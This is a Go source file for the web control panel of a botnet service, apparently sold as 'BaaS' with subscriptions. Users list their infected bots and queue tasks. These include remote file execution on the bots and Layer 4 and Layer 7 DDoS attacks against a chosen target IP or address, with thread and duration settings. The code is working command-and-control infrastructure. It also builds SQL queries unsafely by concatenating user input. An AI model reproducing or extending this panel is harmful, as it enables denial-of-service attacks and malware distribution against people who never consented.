package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"strconv"
	"strings"
	"time"
	"utils"
)

type bot struct {
	OS string
	IP string
	CurrentTask string
	LastResp string
	Status string
}

type task struct {
	Type string
	Param string
	Now string
	Goal string
}

func showIndexPage(c *gin.Context) {
	render(c, gin.H{
		"title": "Home Page",
	}, "index.html")
}

func showLoginPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			c.Redirect(302, "/news")
		}
	}
	render(c, gin.H{
		"title": "Sign in",
	}, "signin.html")
}

func showRegistrationPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			c.Redirect(302, "/news")
		}
	}
	render(c, gin.H{
		"title": "Sign up",
	}, "signup.html")
}

func showBaaSPage(c *gin.Context) {
	render(c, gin.H{
		"title": "Baas",
	}, "baas.html")
}

func showNewsPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			content, _ := ioutil.ReadFile("news.conf")
			render(c, gin.H{
				"title": "News",
				"content": string(content),
			}, "panel-news.html")
		} else {
			c.Redirect(302, "/signin")
		}
	} else {
		c.Redirect(302, "/signin")
	}
}

func subtractTime(time1, time2 time.Time) int{
	diff := time2.Sub(time1).Seconds()
	return int(diff)
}

func renderBots(username string) ([]bot, int, int, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return nil, 0, 0, err
	}
	defer db.Close()
	tableName := username + "_b"
	query := "SELECT * FROM " + tableName
	rows, _ := db.Query(query)
	var os, ip, current_t, last_resp string
	onlineCnt := 0
	offlineCnt := 0
	var botList []bot

	for rows.Next() {
		err := rows.Scan(&os, &ip, &current_t, &last_resp)
		if err != nil {
			return nil, 0, 0, err
		}
		lr_t, err := time.Parse("2006-01-02 15:04:05", last_resp)
		if err != nil {
			fmt.Println(err)
		}
		loc, _ := time.LoadLocation("UTC")
		t := time.Now().In(loc)
		diff_sec := subtractTime(lr_t, t)
		var status string
		interval, err := strconv.Atoi(getInterval(username))
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(diff_sec)
		if diff_sec < interval {
			status = "Online"
			onlineCnt += 1
		} else {
			status = "Offline"
			offlineCnt += 1
		}
		temp := bot{OS: os, IP: ip, CurrentTask: current_t, LastResp: last_resp, Status: status}
		botList = append(botList, temp)
	}
		return botList, onlineCnt, offlineCnt, nil
}

func showBotsPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			list, onlineBot, offlineBot, err := renderBots(username.(string))
			if err != nil {
				fmt.Println(err)
			}
			render(c, gin.H{
				"title": "Bots",
				"payload": list,
				"OnBot": onlineBot,
				"OffBot": offlineBot,
				"Total": onlineBot + offlineBot,
			}, "panel-bots.html")
		} else {
			c.Redirect(302, "/signin")
		}
	} else {
		c.Redirect(302, "/signin")
	}
}

func renderTasks(username string) ([]task, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	tableName := username + "_t"
	query := "SELECT * FROM " + tableName
	rows, _ := db.Query(query)
	var taskType, param, goal, now, tag string
	var taskList []task

	for rows.Next() {
		err := rows.Scan(&taskType, &param, &goal, &now, &tag)
		if err != nil {
			return nil, err
		}
		taskType = strings.Split(taskType, "|")[0]
		temp := task{Type: taskType, Param: param, Now: now, Goal: goal}
		taskList = append(taskList, temp)
	}
		return taskList, nil
}

func showTaskPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			updateStatus(username.(string))
			list, err := renderTasks(username.(string))
			if err != nil {
				fmt.Println(err)
			}
			render(c, gin.H{
				"title": "Task",
				"payload": list,
			}, "panel-tasks.html")
		} else {
			c.Redirect(302, "/signin")
		}
	} else {
		c.Redirect(302, "/signin")
	}
}

func showUserPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			updateStatus(username.(string))
			render(c, gin.H{
				"title": "User",
				"status": strings.ToUpper(getUserInfo(username.(string))),
				"expdate": getExpDate(username.(string)),
			}, "panel-user.html")
		} else {
			c.Redirect(302, "/signin")
		}
	} else {
		c.Redirect(302, "/signin")
	}
}

func addTask(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			taskType := c.PostForm("tasktype")
			if taskType != "" {
				taskValue, _ := strconv.Atoi(taskType)
				if taskValue == 1 || taskValue == 2 || taskValue == 3 || taskValue == 4 {
					taskType := "File Execution |" + strconv.Itoa(taskValue)
					fileAddress := c.PostForm("fd")
					numOfExec := c.PostForm("noe")
					nOE, err := strconv.Atoi(numOfExec)
					if err != nil {
						c.Redirect(302, "/tasks")
					}
					_, onBotCnt, _, _ := renderBots(username.(string))
					if nOE == 0 {
						nOE = onBotCnt
					}
					err = addTasktoDB(username.(string), taskType, fileAddress, strconv.Itoa(nOE))
					if err != nil {
						fmt.Println(err)
					}
				} else if taskValue == 5 || taskValue == 6 {
					taskType := "Layer 4 Attack |" + strconv.Itoa(taskValue)
					param := c.PostForm("ip") + ";" + c.PostForm("thread") + ";" + c.PostForm("time")
					numOfExec := c.PostForm("noe")
					nOE, err := strconv.Atoi(numOfExec)
					if err != nil {
						c.Redirect(302, "/tasks")
					}
					_, onBotCnt, _, _ := renderBots(username.(string))
					if nOE == 0 {
						nOE = onBotCnt
					}
					err = addTasktoDB(username.(string), taskType, param, strconv.Itoa(nOE))
					if err != nil {
						fmt.Println(err)
					}
				} else if taskValue == 7 || taskValue == 8 || taskValue == 9 || taskValue == 10 || taskValue == 11 {
					taskType := "Layer 7 Attack |" + strconv.Itoa(taskValue)
					param := c.PostForm("addr") + ";" + c.PostForm("thread") + ";" + c.PostForm("time")
					numOfExec := c.PostForm("noe")
					nOE, err := strconv.Atoi(numOfExec)
					if err != nil {
						c.Redirect(302, "/tasks")
					}
					_, onBotCnt, _, _ := renderBots(username.(string))
					if nOE == 0 {
						nOE = onBotCnt
					}
					err = addTasktoDB(username.(string), taskType, param, strconv.Itoa(nOE))
					if err != nil {
						fmt.Println(err)
					}
				}
				c.Redirect(302, "/tasks")
			} else {
				c.Redirect(302, "/tasks")
			}
		} else {
			c.Redirect(302, "/signin")
		}
	} else {
		c.Redirect(302, "/signin")
	}
}

func addTasktoDB(username, tType, param, goal string) error {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return err
	}
	defer db.Close()
	tableName := username + "_t"
	query := fmt.Sprintf("INSERT INTO %s VALUES (\"%s\", \"%s\", \"%s\", \"0\", \"%s\")", tableName, tType, param, goal, utils.RandomString(20, true))
	result, err := db.Exec(query)
		if err != nil {
		return err
	}
	n, err := result.RowsAffected()
	if n == 1 {
		return nil
	}
	return err
}

